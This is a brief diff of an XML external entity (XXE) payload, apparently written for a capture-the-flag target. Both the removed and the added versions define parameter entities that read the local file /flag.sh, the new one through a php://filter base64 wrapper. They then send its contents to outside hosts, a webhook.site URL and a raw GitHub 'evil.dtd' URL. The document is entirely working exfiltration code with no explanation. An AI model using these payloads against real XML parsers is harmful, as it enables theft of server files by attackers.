@@ -1,3 +1,2 @@
-<!ENTITY % file SYSTEM "file:///flag.sh">
-<!ENTITY % all "<!ENTITY send SYSTEM 'https://webhook.site/32fc1023-7080-4bd9-81ab-711c4d84dc7d/?data=%file;'>">
-%all;
+<!ENTITY % file SYSTEM "php://filter/read=convert.base64-encode/resource=file:///flag.sh">
+<!ENTITY % int "<!ENTITY &#37; send SYSTEM 'https://raw.githubusercontent.com/linjiang29/xxe-test/refs/heads/main/evil.dtd?p=%file;'>">
